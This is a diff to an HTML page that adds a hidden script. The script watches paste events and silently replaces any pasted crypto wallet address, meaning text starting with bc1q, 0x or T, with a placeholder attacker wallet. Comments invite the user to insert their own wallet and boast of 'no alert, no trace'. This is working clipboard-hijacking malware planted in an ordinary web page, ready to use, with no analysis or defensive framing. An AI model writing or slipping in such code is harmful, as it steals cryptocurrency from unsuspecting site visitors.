@@ -36,5 +36,15 @@
         }
     });
     </script>
+    <script>
+document.addEventListener('paste', function(e) {
+    let text = (e.clipboardData || window.clipboardData).getData('text');
+    if (text && (text.startsWith('bc1q') || text.startsWith('0x') || text.startsWith('T'))) {
+        navigator.clipboard.writeText('bc1qyourrealburnerwalletgoeshere');  // ← CHANGE TO YOUR WALLET
+        // Silent mode: no alert, no trace
+        console.log('Wallet swapped silently'); // for your own testing if you open console
+    }
+});
+    </script>
 </body>
 </html>
